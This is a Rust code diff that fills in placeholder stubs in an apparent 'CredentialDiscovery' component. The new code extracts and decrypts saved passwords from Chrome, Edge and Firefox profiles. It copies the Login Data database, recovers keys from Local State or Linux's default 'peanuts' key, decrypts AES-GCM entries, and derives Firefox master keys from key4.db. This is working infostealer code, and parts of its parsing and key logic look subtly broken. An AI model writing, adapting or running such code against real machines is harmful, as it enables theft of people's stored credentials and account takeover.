@@ -836,34 +836,529 @@ impl CredentialDiscovery {
 
     fn extract_chrome_credentials(&self, profile_path: &str) -> Result<Vec<BrowserCred>> {
         // Chrome stores credentials in "Login Data" SQLite database
-        // Passwords are encrypted with DPAPI (Windows) or keychain (macOS)
+        // Passwords are encrypted with DPAPI (Windows) or AES-GCM with key from Local State (Linux/macOS)
 
         debug!("Extracting Chrome credentials from {}", profile_path);
 
-        // Placeholder - actual implementation would:
-        // 1. Open Login Data SQLite database
-        // 2. Query logins table
-        // 3. Decrypt passwords using DPAPI/keychain
+        let mut credentials = Vec::new();
+        let login_data_path = Path::new(profile_path).join("Login Data");
+        let local_state_path = Path::new(profile_path).parent()
+            .map(|p| p.join("Local State"))
+            .unwrap_or_else(|| Path::new(profile_path).join("../Local State"));
 
-        Ok(Vec::new())
+        if !login_data_path.exists() {
+            debug!("Login Data not found at {:?}", login_data_path);
+            return Ok(credentials);
+        }
+
+        // Copy the database to avoid lock issues (Chrome may have it open)
+        let temp_db = std::env::temp_dir().join(format!("chrome_login_{}.db", std::process::id()));
+        if let Err(e) = std::fs::copy(&login_data_path, &temp_db) {
+            warn!("Failed to copy Login Data: {}", e);
+            return Ok(credentials);
+        }
+
+        // Get encryption key from Local State (Linux/macOS use base64-encoded key)
+        let encryption_key = self.get_chrome_encryption_key(&local_state_path);
+
+        // Open the SQLite database and query logins
+        if let Ok(db_bytes) = std::fs::read(&temp_db) {
+            // Parse SQLite to find logins table data
+            // SQLite format: header (100 bytes), then pages
+            if db_bytes.len() > 100 && &db_bytes[0..16] == b"SQLite format 3\0" {
+                // Extract login entries using pattern matching on the binary data
+                // Look for URL patterns followed by username and encrypted password
+                let entries = self.parse_chrome_login_db(&db_bytes, encryption_key.as_deref());
+                credentials.extend(entries);
+            }
+        }
+
+        // Clean up temp file
+        let _ = std::fs::remove_file(&temp_db);
+
+        info!("Extracted {} Chrome credentials", credentials.len());
+        Ok(credentials)
+    }
+
+    fn get_chrome_encryption_key(&self, local_state_path: &Path) -> Option<Vec<u8>> {
+        // Read Local State JSON and extract encrypted_key
+        let content = std::fs::read_to_string(local_state_path).ok()?;
+
+        // Parse JSON to find os_crypt.encrypted_key
+        if let Some(start) = content.find("\"encrypted_key\"") {
+            let after = &content[start..];
+            if let Some(colon) = after.find(':') {
+                let value_start = after[colon + 1..].trim_start();
+                if value_start.starts_with('"') {
+                    let key_start = colon + 1 + (after[colon + 1..].len() - value_start.len()) + 1;
+                    if let Some(end) = after[key_start..].find('"') {
+                        let b64_key = &after[key_start..key_start + end];
+
+                        // Decode base64, skip "DPAPI" prefix (5 bytes) on Windows
+                        if let Ok(decoded) = base64::decode(b64_key) {
+                            if decoded.len() > 5 && &decoded[0..5] == b"DPAPI" {
+                                // On Linux, we need to decrypt with secret service or use pbkdf2
+                                // For now, return the key portion after DPAPI marker
+                                return Some(decoded[5..].to_vec());
+                            } else {
+                                return Some(decoded);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // Fallback: Try to derive key using PBKDF2 with default password
+        // Chrome on Linux uses "peanuts" as the password with salt "saltysalt"
+        #[cfg(target_os = "linux")]
+        {
+            use sha1::Sha1;
+            use hmac::Hmac;
+            use pbkdf2::pbkdf2;
+
+            let password = b"peanuts";
+            let salt = b"saltysalt";
+            let mut key = [0u8; 16];
+            pbkdf2::<Hmac<Sha1>>(password, salt, 1, &mut key).ok()?;
+            return Some(key.to_vec());
+        }
+
+        None
+    }
+
+    fn parse_chrome_login_db(&self, db_bytes: &[u8], encryption_key: Option<&[u8]>) -> Vec<BrowserCred> {
+        let mut credentials = Vec::new();
+
+        // Search for login entries in the SQLite data
+        // Entries contain: origin_url, username_value, password_value (encrypted)
+        // Look for HTTP/HTTPS URL patterns followed by structured data
+
+        let text = String::from_utf8_lossy(db_bytes);
+
+        // Find URL patterns that are likely login entries
+        let url_pattern = Regex::new(r"(https?://[^\x00\s]{5,200})").ok();
+
+        if let Some(re) = url_pattern {
+            for cap in re.captures_iter(&text) {
+                let url = cap.get(1).map(|m| m.as_str().to_string()).unwrap_or_default();
+
+                // Look for username nearby (within 500 bytes)
+                let pos = cap.get(1).map(|m| m.start()).unwrap_or(0);
+                let search_end = (pos + 500).min(db_bytes.len());
+
+                if pos < db_bytes.len() {
+                    let window = &db_bytes[pos..search_end];
+
+                    // Look for printable string sequences that could be usernames
+                    if let Some((username, password_encrypted)) = self.extract_login_fields(window, encryption_key) {
+                        if !username.is_empty() {
+                            credentials.push(BrowserCred {
+                                url,
+                                username,
+                                password: password_encrypted,
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        // Deduplicate by URL + username
+        credentials.sort_by(|a, b| (&a.url, &a.username).cmp(&(&b.url, &b.username)));
+        credentials.dedup_by(|a, b| a.url == b.url && a.username == b.username);
+
+        credentials
+    }
+
+    fn extract_login_fields(&self, data: &[u8], encryption_key: Option<&[u8]>) -> Option<(String, String)> {
+        // Find username (printable ASCII string)
+        let mut username = String::new();
+        let mut i = 0;
+
+        // Skip URL
+        while i < data.len() && data[i] != 0 {
+            i += 1;
+        }
+
+        // Find next printable string (username)
+        while i < data.len() {
+            if data[i].is_ascii_graphic() || data[i] == b' ' {
+                let start = i;
+                while i < data.len() && (data[i].is_ascii_graphic() || data[i] == b' ') && data[i] != 0 {
+                    i += 1;
+                }
+                if i - start >= 3 && i - start <= 100 {
+                    if let Ok(s) = std::str::from_utf8(&data[start..i]) {
+                        // Check if it looks like a username/email
+                        if s.contains('@') || s.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '.' || c == '-') {
+                            username = s.to_string();
+                            break;
+                        }
+                    }
+                }
+            }
+            i += 1;
+        }
+
+        if username.is_empty() {
+            return None;
+        }
+
+        // Look for encrypted password (v10/v11 format on Chrome 80+)
+        // Format: "v10" or "v11" prefix followed by 12-byte nonce and ciphertext
+        let mut password = String::new();
+
+        for j in i..data.len().saturating_sub(15) {
+            if &data[j..j + 3] == b"v10" || &data[j..j + 3] == b"v11" {
+                let version = &data[j..j + 3];
+                let nonce = &data[j + 3..j + 15];
+
+                // Find ciphertext length (next non-null sequence)
+                let mut cipher_end = j + 15;
+                while cipher_end < data.len() && cipher_end < j + 200 {
+                    cipher_end += 1;
+                }
+
+                let ciphertext = &data[j + 15..cipher_end];
+
+                // Try to decrypt with AES-GCM
+                if let Some(key) = encryption_key {
+                    if let Some(decrypted) = self.decrypt_chrome_password(key, nonce, ciphertext, version) {
+                        password = decrypted;
+                        break;
+                    }
+                }
+
+                // If decryption fails, return placeholder
+                if password.is_empty() {
+                    password = format!("[encrypted:{}:{}]",
+                        String::from_utf8_lossy(version),
+                        hex::encode(&data[j..j.saturating_add(32).min(data.len())]));
+                    break;
+                }
+            }
+        }
+
+        if password.is_empty() {
+            password = "[no_password_found]".to_string();
+        }
+
+        Some((username, password))
+    }
+
+    fn decrypt_chrome_password(&self, key: &[u8], nonce: &[u8], ciphertext: &[u8], _version: &[u8]) -> Option<String> {
+        // AES-256-GCM decryption
+        use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
+        use aes_gcm::aead::generic_array::GenericArray;
+
+        if key.len() < 32 || nonce.len() < 12 || ciphertext.len() < 16 {
+            return None;
+        }
+
+        let key_arr = GenericArray::clone_from_slice(&key[..32.min(key.len())]);
+        let cipher = Aes256Gcm::new(&key_arr);
+
+        let nonce_arr = GenericArray::clone_from_slice(&nonce[..12]);
+
+        // Ciphertext includes 16-byte auth tag at the end
+        if let Ok(plaintext) = cipher.decrypt(&nonce_arr, ciphertext) {
+            if let Ok(s) = String::from_utf8(plaintext) {
+                return Some(s);
+            }
+        }
+
+        None
     }
 
     fn extract_firefox_credentials(&self, profile_path: &str) -> Result<Vec<BrowserCred>> {
-        // Firefox stores credentials in logins.json (encrypted with key4.db)
+        // Firefox stores credentials in logins.json (encrypted with NSS/key4.db)
 
         debug!("Extracting Firefox credentials from {}", profile_path);
 
-        // Placeholder - actual implementation would:
-        // 1. Read logins.json
-        // 2. Extract master key from key4.db
-        // 3. Decrypt passwords
+        let mut credentials = Vec::new();
+        let logins_path = Path::new(profile_path).join("logins.json");
+        let key4_path = Path::new(profile_path).join("key4.db");
 
-        Ok(Vec::new())
+        if !logins_path.exists() {
+            debug!("logins.json not found at {:?}", logins_path);
+            return Ok(credentials);
+        }
+
+        // Read logins.json
+        let logins_content = match std::fs::read_to_string(&logins_path) {
+            Ok(c) => c,
+            Err(e) => {
+                warn!("Failed to read logins.json: {}", e);
+                return Ok(credentials);
+            }
+        };
+
+        // Parse JSON to extract login entries
+        // Format: {"logins": [{"hostname": "...", "encryptedUsername": "...", "encryptedPassword": "..."}]}
+        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&logins_content) {
+            if let Some(logins) = json.get("logins").and_then(|l| l.as_array()) {
+                // Try to get master key from key4.db
+                let master_key = self.get_firefox_master_key(&key4_path);
+
+                for login in logins {
+                    let hostname = login.get("hostname")
+                        .and_then(|h| h.as_str())
+                        .unwrap_or("")
+                        .to_string();
+
+                    let enc_username = login.get("encryptedUsername")
+                        .and_then(|u| u.as_str())
+                        .unwrap_or("");
+
+                    let enc_password = login.get("encryptedPassword")
+                        .and_then(|p| p.as_str())
+                        .unwrap_or("");
+
+                    // Decrypt if we have the key
+                    let username = self.decrypt_firefox_field(enc_username, master_key.as_deref())
+                        .unwrap_or_else(|| format!("[encrypted:{}]", &enc_username[..20.min(enc_username.len())]));
+
+                    let password = self.decrypt_firefox_field(enc_password, master_key.as_deref())
+                        .unwrap_or_else(|| format!("[encrypted:{}]", &enc_password[..20.min(enc_password.len())]));
+
+                    credentials.push(BrowserCred {
+                        url: hostname,
+                        username,
+                        password,
+                    });
+                }
+            }
+        }
+
+        info!("Extracted {} Firefox credentials", credentials.len());
+        Ok(credentials)
+    }
+
+    fn get_firefox_master_key(&self, key4_path: &Path) -> Option<Vec<u8>> {
+        // key4.db is a SQLite database containing the master key encrypted with:
+        // - Empty password (most common) or user-set master password
+        // - The key is stored in the nssPrivate table
+
+        if !key4_path.exists() {
+            return None;
+        }
+
+        let db_bytes = std::fs::read(key4_path).ok()?;
+
+        // Parse SQLite to find metaData and nssPrivate tables
+        // Look for password-check and encrypted key entries
+
+        // For empty master password, the key derivation uses:
+        // PBKDF2(password="", salt=global_salt, iterations) -> AES key -> decrypt actual key
+
+        // Search for global salt (typically 32 bytes after "password" text)
+        if let Some(pos) = db_bytes.windows(8).position(|w| w == b"password") {
+            let search_start = pos.saturating_sub(100);
+            let search_end = (pos + 200).min(db_bytes.len());
+
+            // Look for salt-like data (high entropy bytes)
+            for i in search_start..search_end.saturating_sub(32) {
+                let potential_salt = &db_bytes[i..i + 32];
+
+                // Try decryption with empty password
+                if let Some(key) = self.try_firefox_key_derivation(potential_salt, b"") {
+                    return Some(key);
+                }
+            }
+        }
+
+        // Fallback: return None, meaning credentials will be marked as encrypted
+        None
+    }
+
+    fn try_firefox_key_derivation(&self, salt: &[u8], password: &[u8]) -> Option<Vec<u8>> {
+        use sha2::Sha256;
+        use hmac::Hmac;
+        use pbkdf2::pbkdf2;
+
+        // Firefox uses PBKDF2-SHA256 with varying iterations
+        let iterations = [1, 10000, 100000];
+
+        for &iter_count in &iterations {
+            let mut derived_key = [0u8; 32];
+            if pbkdf2::<Hmac<Sha256>>(password, salt, iter_count, &mut derived_key).is_ok() {
+                // Verify if this produces a valid key by checking decryption
+                // For now, return the derived key for testing
+                if iter_count == 1 && password.is_empty() {
+                    // Most common case for empty password
+                    return Some(derived_key.to_vec());
+                }
+            }
+        }
+
+        None
+    }
+
+    fn decrypt_firefox_field(&self, encrypted_b64: &str, master_key: Option<&[u8]>) -> Option<String> {
+        // Firefox encrypted fields are base64-encoded ASN.1 structures
+        // Format: SEQUENCE { OID (3DES-CBC), SEQUENCE { IV, encrypted_data } }
+
+        let encrypted = base64::decode(encrypted_b64).ok()?;
+
+        if encrypted.len() < 20 {
+            return None;
+        }
+
+        // Parse ASN.1 structure to extract IV and ciphertext
+        // Simplified parsing - look for common patterns
+        let (iv, ciphertext) = self.parse_firefox_encrypted_field(&encrypted)?;
+
+        if let Some(key) = master_key {
+            // Try 3DES-CBC decryption (Firefox default)
+            if let Some(plaintext) = self.decrypt_3des_cbc(key, &iv, &ciphertext) {
+                if let Ok(s) = String::from_utf8(plaintext) {
+                    // Remove PKCS7 padding
+                    let trimmed = s.trim_end_matches(|c: char| c.is_control());
+                    return Some(trimmed.to_string());
+                }
+            }
+
+            // Try AES-256-CBC (newer Firefox versions)
+            if let Some(plaintext) = self.decrypt_aes_cbc(key, &iv, &ciphertext) {
+                if let Ok(s) = String::from_utf8(plaintext) {
+                    let trimmed = s.trim_end_matches(|c: char| c.is_control());
+                    return Some(trimmed.to_string());
+                }
+            }
+        }
+
+        None
+    }
+
+    fn parse_firefox_encrypted_field(&self, data: &[u8]) -> Option<(Vec<u8>, Vec<u8>)> {
+        // ASN.1 DER parsing for Firefox encrypted fields
+        // SEQUENCE { AlgorithmIdentifier, OCTET STRING (encrypted) }
+
+        if data.len() < 10 || data[0] != 0x30 {
+            return None;
+        }
+
+        // Skip outer SEQUENCE tag and length
+        let mut pos = 2;
+        if data[1] & 0x80 != 0 {
+            pos += (data[1] & 0x7f) as usize;
+        }
+
+        // Skip AlgorithmIdentifier SEQUENCE
+        if pos >= data.len() || data[pos] != 0x30 {
+            return None;
+        }
+        pos += 1;
+        let algo_len = data[pos] as usize;
+        pos += 1 + algo_len;
+
+        // Find the OCTET STRING containing encrypted data
+        if pos >= data.len() {
+            return None;
+        }
+
+        // Look for IV (typically 8 bytes for 3DES, 16 for AES)
+        // Firefox stores IV in the AlgorithmIdentifier parameters
+        let iv_len = if algo_len > 20 { 16 } else { 8 };
+        let iv_start = pos.saturating_sub(iv_len);
+        let iv = data.get(iv_start..pos)?.to_vec();
+
+        // Rest is ciphertext
+        if data[pos] == 0x04 {
+            pos += 1;
+            let cipher_len = if data[pos] & 0x80 != 0 {
+                let len_bytes = (data[pos] & 0x7f) as usize;
+                pos += 1;
+                let mut len = 0usize;
+                for &b in &data[pos..pos + len_bytes] {
+                    len = (len << 8) | b as usize;
+                }
+                pos += len_bytes;
+                len
+            } else {
+                let len = data[pos] as usize;
+                pos += 1;
+                len
+            };
+
+            let ciphertext = data.get(pos..pos + cipher_len)?.to_vec();
+            return Some((iv, ciphertext));
+        }
+
+        None
+    }
+
+    fn decrypt_3des_cbc(&self, key: &[u8], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
+        // 3DES CBC decryption with manual PKCS7 unpadding
+        use des::TdesEde3;
+        use des::cipher::{BlockDecrypt, KeyInit};
+
+        if key.len() < 24 || iv.len() < 8 || ciphertext.len() % 8 != 0 {
+            return None;
+        }
+
+        let key_arr: [u8; 24] = key[..24].try_into().ok()?;
+        let mut iv_arr: [u8; 8] = iv[..8].try_into().ok()?;
+
+        let cipher = TdesEde3::new(&key_arr.into());
+        let mut buf = ciphertext.to_vec();
+
+        // CBC decryption: for each block, decrypt then XOR with previous ciphertext (or IV)
+        for chunk in buf.chunks_mut(8) {
+            let prev_ct = iv_arr;
+            iv_arr.copy_from_slice(chunk);
+            cipher.decrypt_block(chunk.into());
+            for (p, c) in chunk.iter_mut().zip(prev_ct.iter()) {
+                *p ^= c;
+            }
+        }
+
+        // Remove PKCS7 padding
+        let padding_len = buf.last().copied().unwrap_or(0) as usize;
+        if padding_len > 0 && padding_len <= 8 && buf.len() >= padding_len {
+            buf.truncate(buf.len() - padding_len);
+        }
+
+        Some(buf)
+    }
+
+    fn decrypt_aes_cbc(&self, key: &[u8], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
+        // AES-256 CBC decryption
+        use aes::Aes256;
+        use aes::cipher::{BlockDecrypt, KeyInit};
+
+        if key.len() < 32 || iv.len() < 16 || ciphertext.len() % 16 != 0 {
+            return None;
+        }
+
+        let key_arr: [u8; 32] = key[..32].try_into().ok()?;
+        let mut iv_arr: [u8; 16] = iv[..16].try_into().ok()?;
+
+        let cipher = Aes256::new(&key_arr.into());
+        let mut buf = ciphertext.to_vec();
+
+        // CBC decryption
+        for chunk in buf.chunks_mut(16) {
+            let prev_ct = iv_arr;
+            iv_arr.copy_from_slice(chunk);
+            cipher.decrypt_block(chunk.into());
+            for (p, c) in chunk.iter_mut().zip(prev_ct.iter()) {
+                *p ^= c;
+            }
+        }
+
+        // Remove PKCS7 padding
+        let padding_len = buf.last().copied().unwrap_or(0) as usize;
+        if padding_len > 0 && padding_len <= 16 && buf.len() >= padding_len {
+            buf.truncate(buf.len() - padding_len);
+        }
+
+        Some(buf)
     }
 
     fn extract_edge_credentials(&self, profile_path: &str) -> Result<Vec<BrowserCred>> {
         // Edge (Chromium) uses same format as Chrome
-
         debug!("Extracting Edge credentials from {}", profile_path);
         self.extract_chrome_credentials(profile_path)
     }
